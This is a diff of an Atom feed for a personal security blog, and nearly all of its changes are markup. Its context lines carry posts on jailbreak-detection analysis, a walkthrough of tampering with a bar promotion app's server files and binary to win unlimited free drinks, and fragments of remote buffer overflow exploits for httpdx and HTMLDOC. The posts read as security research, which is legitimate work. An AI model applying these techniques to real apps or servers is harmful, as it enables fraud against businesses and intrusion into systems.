@@ -4,7 +4,7 @@
 <generator uri="https://github.com/jekyll/jekyll">Jekyll</generator>
 <link rel="self" type="application/atom+xml" href="/feed.xml" />
 <link rel="alternate" type="text/html" href="" />
-<updated>2015-11-06T11:41:45+08:00</updated>
+<updated>2015-11-14T09:31:33+08:00</updated>
 <id>/</id>
 <author>
   <name>Pankaj Kohli</name>
@@ -12,6 +12,8 @@
   
 </author>
 
+
+  
 
 <entry>
   <title type="html"><![CDATA[Converting IDA Pro graphs to images]]></title>
@@ -38,11 +40,11 @@
 
 &lt;p&gt;To convert it into a PNG (or any other format) image, first install the Graph::Easy CPAN module. It requires &lt;a href=&quot;http://www.graphviz.org/&quot;&gt;Graphviz&lt;/a&gt; to run, so install that as well.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cpan Graph::Easy&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cpan Graph::Easy&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Then, convert the .gdl file to an image.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;graph-easy --from gdl --input&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;graph.gdl --png --output&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;graph.png&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;graph-easy --from gdl --input&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;graph.gdl --png --output&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;graph.png&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;This is how the final image of the above graph looks like.&lt;/p&gt;
 
@@ -56,6 +58,8 @@
   </content>
 </entry>
 
+
+  
 
 <entry>
   <title type="html"><![CDATA[AppMinder jailbreak detection analysis]]></title>
@@ -71,15 +75,15 @@
   <content type="html">
     &lt;p&gt;Neso Lab’s &lt;a href=&quot;http://appminder.nesolabs.de/&quot;&gt;AppMinder&lt;/a&gt; project is another attempt at providing jailbreak detection for enterprise iOS applications (and perhaps AppStore apps). It provides three variants of jailbreak detections codes, each with an increasing level of self integrity checks and code obfuscation, and optionally including anti-debugging checks. It generates a piece of code with a function containing inline assembly code which can be inserted into the app’s source code and called where jailbreak detection needs to be implemented. The generated code is metamorphic with a random function name. Metamorphism is achieved by a combination of register interchanges, instruction reordering, inserting dead code such as unused &lt;code&gt;push&lt;/code&gt;, &lt;code&gt;pop&lt;/code&gt; and &lt;code&gt;cmp&lt;/code&gt; instructions.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#if !(TARGET_IPHONE_SIMULATOR)&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#if !(TARGET_IPHONE_SIMULATOR)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;__attribute__&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;always_inline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;FsNZKlEjkXtDxShPvqbttYCo&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;mov r0, r0;mov r2, #152;sub r0, r2, #121;sub r1, r1;mov r2, #1;sub r2, #1;sub r3, r3;mov r4, #23;add r12, r4, #3;svc 0x80;mov r0, #76;mov r1, #2;b #2;push {r0-r12};mov r12, r1;b #2;pop {r0-r15};sub r1, r1, r1;b #1;cmp r0, r10;mov r0, r1;svc 0x80;cmp r0, #1;b #2;stmdb sp!, {r0-r12};bne #1;b #8;mov r0, #1;mov r12, #1;svc 0x80;mov r2, #12;sub r2, r2, r0;add r2, pc;bx r2;mov r0, #1;mov r12, #1;svc 0x80;b #1;cmp r0, r10;mov r1, r1;sub r1, r1, r1;b #2;push {r0-r12};mov r0, r1;mov r12, #256;asr r12, #7;b #1;cmp r0, r10;mov r1, #29;mov r0, r1;b #2;stmdb sp!, {r0-r12};svc 0x80;mov r2, r2;sub r1, r1, r1;mov r1, r1;mov r3, r1;add r3, r3, #1;cmp r0, r3;mov r2, r2;beq #8;mov r0, #1;mov r12, #1;svc 0x80;mov r1, r0;add r0, r0, #3;add r0, pc;mov pc, r0;pop {r0-r15};mov r0, r1;mov r0, r0;mov r3, #34;sub r0, r3, #3;sub r2, r2;mov r1, r2;sub r2, r2;sub r12, r12;mov r3, r12;mov r4, #193;sub r12, r4, #167;svc 0x80;b #2;pop {r0-r15};&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;r0&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;r1&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;r2&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;r3&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;r4&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;r12&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;cc&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;memory&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;#endif&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;span class=&quot;cp&quot;&gt;#endif&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;The code can be made a little more readable using &lt;code&gt;cat jbdetect.c | tr &#39;;&#39; &#39;\n&#39;&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The code can be made a little more readable using &lt;code&gt;cat jbdetect.c | tr ';' '\n'&lt;/code&gt;.&lt;/p&gt;
 
 &lt;p&gt;The code makes use of &lt;code&gt;svc 0x80&lt;/code&gt; instruction throughout to invoke system calls. &lt;code&gt;svc 0x80&lt;/code&gt; is the ARM counterpart of Intel’s &lt;code&gt;int 0x80&lt;/code&gt; instruction, used to invoke system calls. In iOS, which is a derivative of Darwin, the system call number is passed in r12 and the arguments in r0-r3. The return value is optionally returned in r0. &lt;code&gt;svc&lt;/code&gt; also goes by the name of &lt;code&gt;swi&lt;/code&gt; or &lt;em&gt;software interrupt&lt;/em&gt;.&lt;/p&gt;
 
@@ -109,6 +113,8 @@
 </entry>
 
 
+  
+
 <entry>
   <title type="html"><![CDATA[Dirty Harry: Hacking for free drinks in Singapore]]></title>
   <link rel="alternate" type="text/html" href="/posts/dirty-harry-hacking-for-free-drinks-in-singapore.html" />
@@ -133,7 +139,7 @@
 
 &lt;p&gt;The app communicates with &lt;code&gt;www.exhost.se&lt;/code&gt; over HTTP. When started, the first thing the app does is to define the “luck factor” of the user, by downloading an XML file containing probabilities of various prizes. The probabilities are set in way such that 52% of the time a spin would yield ‘Better Luck Next Time’.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;nf&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/harrys_1_1_beta/venues.xml&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;nf&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/harrys_1_1_beta/venues.xml&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
 &lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;www.exhost.se&lt;/span&gt;
 &lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;Appy Hour 1.1.0 (iPhone; iPhone OS 6.0.1; en_SG)&lt;/span&gt;
 &lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;keep-alive&lt;/span&gt;
@@ -170,13 +176,13 @@ Via: 1.1 qt-mfc4:80
 &amp;lt;IsPrize&amp;gt;1&amp;lt;/IsPrize&amp;gt;
 &amp;lt;PrizeFile&amp;gt;img/2.png&amp;lt;/PrizeFile&amp;gt;
 &amp;lt;/Prize&amp;gt;
---snipped--&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+--snipped--&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;time-restriction&quot;&gt;Time Restriction&lt;/h2&gt;
 
 &lt;p&gt;Once the user has checked in the bar, the app checks if the user has already tried his luck in the past 24 hours in the same bar. It does so by sending a request with the iPhone’s UDID, a timestamp and the bar’s id. The response simply consists of &lt;code&gt;true&lt;/code&gt; if the user is allowed to spin the wheel, or &lt;code&gt;false&lt;/code&gt; otherwise.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;nf&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/harrys_1_1_beta/fetchdata.php?udid=aba5372762118af8f6f0594f836cd0eb32d10986&amp;amp;time=2013-01-11%02:56:15&amp;amp;venue=30&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;nf&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/harrys_1_1_beta/fetchdata.php?udid=aba5372762118af8f6f0594f836cd0eb32d10986&amp;amp;time=2013-01-11%02:56:15&amp;amp;venue=30&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
 &lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;www.exhost.se&lt;/span&gt;
 &lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;Appy Hour 1.1.0 (iPhone; iPhone OS 6.0.1; en_SG)&lt;/span&gt;
 &lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;keep-alive&lt;/span&gt;
@@ -191,13 +197,13 @@ Connection: Keep-Alive
 Transfer-Encoding: chunked
 Content-Type: text/html
 
-true&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+true&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;getting-past-everything&quot;&gt;Getting past everything&lt;/h2&gt;
 
 &lt;p&gt;Well, the simplest way to get past everything would be to make the app communicate with another server instead of &lt;code&gt;www.exhost.se&lt;/code&gt;. First we will crawl &lt;code&gt;www.exhost.se&lt;/code&gt; to get all the required files. The link &lt;code&gt;http://www.exhost.se/harrys_1_1_beta/&lt;/code&gt; does not contain a default &lt;code&gt;index.html&lt;/code&gt; or similar file, which makes crawling possible.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget -nv -r --no-parent --reject &lt;span class=&quot;s2&quot;&gt;&amp;quot;index.html*&amp;quot;&lt;/span&gt; http://www.exhost.se/harrys_1_1_beta/
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget -nv -r --no-parent --reject &lt;span class=&quot;s2&quot;&gt;&amp;quot;index.html*&amp;quot;&lt;/span&gt; http://www.exhost.se/harrys_1_1_beta/
 
 2013-11-03 23:37:09 URL:http://www.exhost.se/harrys_1_1_beta/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;639/639&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; /&lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/index.html&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 
 http://www.exhost.se/robots.txt:
@@ -228,14 +234,14 @@ http://www.exhost.se/robots.txt:
 2013-11-03 23:37:52 URL:http://www.exhost.se/harrys_1_1_beta/js/jquery.min.js &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;85925/85925&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/js/jquery.min.js&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
 FINISHED --2013-11-03 23:37:52--
 Total wall clock &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 54s
-Downloaded: &lt;span class=&quot;m&quot;&gt;25&lt;/span&gt; files, 950K in 34s &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;28.1 KB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+Downloaded: &lt;span class=&quot;m&quot;&gt;25&lt;/span&gt; files, 950K in 34s &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;28.1 KB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;iPhone:~ root# strings -o /var/mobile/Applications/0B57A351-CE6D-4B05-A5D0-8B12BB150791/Harrys.app/Harrys &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep &lt;span class=&quot;s2&quot;&gt;&amp;quot;http://www.exhost.se&amp;quot;&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;iPhone:~ root# strings -o /var/mobile/Applications/0B57A351-CE6D-4B05-A5D0-8B12BB150791/Harrys.app/Harrys &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep &lt;span class=&quot;s2&quot;&gt;&amp;quot;http://www.exhost.se&amp;quot;&lt;/span&gt;
 &lt;span class=&quot;m&quot;&gt;839501&lt;/span&gt; http://www.exhost.se/harrys_1_1_beta/
 &lt;span class=&quot;m&quot;&gt;842849&lt;/span&gt; http://www.exhost.se/harrys_1_1_beta/venues.xml
-&lt;span class=&quot;m&quot;&gt;843075&lt;/span&gt; http://www.exhost.se/harrys_1_1_beta/fetchdata.php&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;span class=&quot;m&quot;&gt;843075&lt;/span&gt; http://www.exhost.se/harrys_1_1_beta/fetchdata.php&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;Once we have the crawled files, we can edit the &lt;code&gt;venues.xml&lt;/code&gt; file to change the probabilities. We can even change the drinks! ;-) Also, the file &lt;code&gt;fetchdata.php&lt;/code&gt; should contain &lt;code&gt;true&lt;/code&gt; for us to spin any number of times. Now these files can be hosted on a different server and these URLs can be changed in the app mach-o binary. Changing only the above two URLs is sufficient to make it work without any restrictions. The strings utility comes handy when trying to find out the location of these strings in the binary. These strings can now be edited using a hex editor.&lt;/p&gt;
+&lt;p&gt;Once we have the crawled files, we can edit the &lt;code&gt;venues.xml&lt;/code&gt; file to change the probabilities. We can even change the drinks! ;-) Also, the file &lt;code&gt;fetchdata.php&lt;/code&gt; should contain &lt;code&gt;true&lt;/code&gt; for us to spin any number of times. Now these files can be hosted on a different server and these URLs can be changed in the app mach-o binary. Changing only the above two URLs is sufficient to make it work without any restrictions. The strings utility comes handy when trying to find out the location of these strings in the binary. These strings can now be edited using a hex editor. &lt;/p&gt;
 
 &lt;figure align=&quot;center&quot;&gt;
     &lt;img src=&quot;/images/strings.png&quot; /&gt;
@@ -251,6 +257,8 @@ Downloaded: &lt;span class=&quot;m&quot;&gt;25&lt;/span&gt; files, 950K in 34s &
   </content>
 </entry>
 
+
+  
 
 <entry>
   <title type="html"><![CDATA[Assembling from scratch: Encoding BLX instruction in ARM / THUMB]]></title>
@@ -272,8 +280,9 @@ Downloaded: &lt;span class=&quot;m&quot;&gt;25&lt;/span&gt; files, 950K in 34s &
 
 &lt;p&gt;One of such intriguing instructions in ARM is BLX. BLX instruction performs a PC relative unconditional branch, and optionally changes mode to ARM or THUMB depending on the target address. It encodes to a 32-bit word under THUMB mode 2. It’s encoding varies depending upon the relative offset between the instruction and the target address. For e.g. the instruction at 0x2EA6 in the disassembly above encodes to &lt;code&gt;D8 F0 08 E8&lt;/code&gt; while another BLX instruction at 0x30C4 encodes to &lt;code&gt;8E F3 C4 E9&lt;/code&gt;. The encoded instruction itself is divided into two 16-bit halves, each of which is shown in little-endian. The actual encodings are therefore F0 D8 E8 08 and F3 8E E9 C4. The encoding is explained in the THUMB instruction set (available &lt;a href=&quot;https://ece.uwaterloo.ca/~ece222/ARM/ARM7-TDMI-manual-pt3.pdf&quot;&gt;here&lt;/a&gt;).&lt;/p&gt;
 
-&lt;figure align=&quot;center&quot; class=&quot;helf&quot;&gt;
+&lt;figure align=&quot;center&quot;&gt;
     &lt;img src=&quot;/images/blxasm1.png&quot; /&gt;
+    &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
     &lt;img src=&quot;/images/blxasm2.png&quot; /&gt;
 &lt;/figure&gt;
 
@@ -285,7 +294,7 @@ Downloaded: &lt;span class=&quot;m&quot;&gt;25&lt;/span&gt; files, 950K in 34s &
 
 &lt;p&gt;The offset is then used to encode the instruction as follows:&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;Offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xD8010
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;Offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xD8010
  
       &lt;span class=&quot;m&quot;&gt;00&lt;/span&gt;            0D            &lt;span class=&quot;m&quot;&gt;80&lt;/span&gt;            10
  
@@ -307,7 +316,7 @@ Bits 32-28    &lt;span class=&quot;m&quot;&gt;27&lt;/span&gt;       26-17      1
  
       &lt;span class=&quot;m&quot;&gt;1111&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0000&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;1101&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1000&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;1110&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1000&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;0000&lt;/span&gt; 1000
  
-         F0            D8             E8           08&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+         F0            D8             E8           08&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;which explains the encoding seen in the disassembler &lt;code&gt;(D8 F0 08 E8)&lt;/code&gt;. :-)&lt;/p&gt;
 
@@ -316,6 +325,8 @@ Bits 32-28    &lt;span class=&quot;m&quot;&gt;27&lt;/span&gt;       26-17      1
   </content>
 </entry>
 
+
+  
 
 <entry>
   <title type="html"><![CDATA[Exploiting File Uploads for Fun and Profit]]></title>
@@ -343,6 +354,8 @@ Bits 32-28    &lt;span class=&quot;m&quot;&gt;27&lt;/span&gt;       26-17      1
 </entry>
 
 
+  
+
 <entry>
   <title type="html"><![CDATA[httpdx 1.4 GET Request Remote Buffer Overflow Exploit (0day)]]></title>
   <link rel="alternate" type="text/html" href="/posts/httpdx-1-4-get-request-remote-buffer-overflow-exploit-0day.html" />
@@ -359,7 +372,7 @@ Bits 32-28    &lt;span class=&quot;m&quot;&gt;27&lt;/span&gt;       26-17      1
 
 &lt;p&gt;This exploit is also available as a metasploit module &lt;a href=&quot;http://www.metasploit.com/modules/exploit/windows/http/httpdx_handlepeer&quot;&gt;here&lt;/a&gt;. Thanks to Trancer for porting it to Metasploit.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cm&quot;&gt;/*&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cm&quot;&gt;/*&lt;/span&gt;
 &lt;span class=&quot;cm&quot;&gt; * httpdx 1.4 GET Request Remote Buffer Overflow Exploit (0day)&lt;/span&gt;
 &lt;span class=&quot;cm&quot;&gt; *&lt;/span&gt;
 &lt;span class=&quot;cm&quot;&gt; * Tested with httpdx 1.4 on Windows XP SP3&lt;/span&gt;
@@ -553,13 +566,15 @@ Bits 32-28    &lt;span class=&quot;m&quot;&gt;27&lt;/span&gt;       26-17      1
     &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[+] Dropping to shell &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
     &lt;p&gt;&lt;a href=&quot;/posts/httpdx-1-4-get-request-remote-buffer-overflow-exploit-0day.html&quot;&gt;httpdx 1.4 GET Request Remote Buffer Overflow Exploit (0day)&lt;/a&gt; was originally published by Pankaj Kohli at &lt;a href=&quot;&quot;&gt;Pankaj Kohli&lt;/a&gt; on September 04, 2009.&lt;/p&gt;
   </content>
 </entry>
 
+
+  
 
 <entry>
   <title type="html"><![CDATA[HTMLDOC 'html' File Handling Remote Stack Buffer Overflow Exploit (Linux)]]></title>
@@ -575,7 +590,7 @@ Bits 32-28    &lt;span class=&quot;m&quot;&gt;27&lt;/span&gt;       26-17      1
   <content type="html">
     &lt;p&gt;The vulnerability exists in HTMLDOC version 1.8.27 and earlier due to an unsafe call to &lt;code&gt;sscanf()&lt;/code&gt; in the &lt;code&gt;set_page_size()&lt;/code&gt; function in &lt;code&gt;htmldoc/util.cxx&lt;/code&gt;. This can be exploited to cause a stack-based buffer overflow when an HTML document containing e.g. a specially crafted “MEDIA SIZE” comment is being processed.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cm&quot;&gt;/*&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cm&quot;&gt;/*&lt;/span&gt;
 &lt;span class=&quot;cm&quot;&gt; &lt;/span&gt;
 &lt;span class=&quot;cm&quot;&gt;HTMLDOC &amp;#39;html&amp;#39; File Handling Remote Stack Buffer Overflow Exploit (Linux)&lt;/span&gt;
 &lt;span class=&quot;cm&quot;&gt;Reference: http://www.securityfocus.com/bid/35727&lt;/span&gt;
@@ -653,13 +668,15 @@ Bits 32-28    &lt;span class=&quot;m&quot;&gt;27&lt;/span&gt;       26-17      1
     &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Run as: htmldoc -f somefile.pdf sploit.html&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  
     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
-    &lt;p&gt;&lt;a href=&quot;/posts/htmldoc-html-file-handling-remote-stack-buffer-overflow-exploit-linux.html&quot;&gt;HTMLDOC &#39;html&#39; File Handling Remote Stack Buffer Overflow Exploit (Linux)&lt;/a&gt; was originally published by Pankaj Kohli at &lt;a href=&quot;&quot;&gt;Pankaj Kohli&lt;/a&gt; on August 20, 2009.&lt;/p&gt;
+    &lt;p&gt;&lt;a href=&quot;/posts/htmldoc-html-file-handling-remote-stack-buffer-overflow-exploit-linux.html&quot;&gt;HTMLDOC 'html' File Handling Remote Stack Buffer Overflow Exploit (Linux)&lt;/a&gt; was originally published by Pankaj Kohli at &lt;a href=&quot;&quot;&gt;Pankaj Kohli&lt;/a&gt; on August 20, 2009.&lt;/p&gt;
   </content>
 </entry>
 
+
+  
 
 <entry>
   <title type="html"><![CDATA[VLC Media Player 'smb://' URI Handling Remote Buffer Overflow Vulnerability Exploit]]></title>
@@ -675,7 +692,7 @@ Bits 32-28    &lt;span class=&quot;m&quot;&gt;27&lt;/span&gt;       26-17      1
   <content type="html">
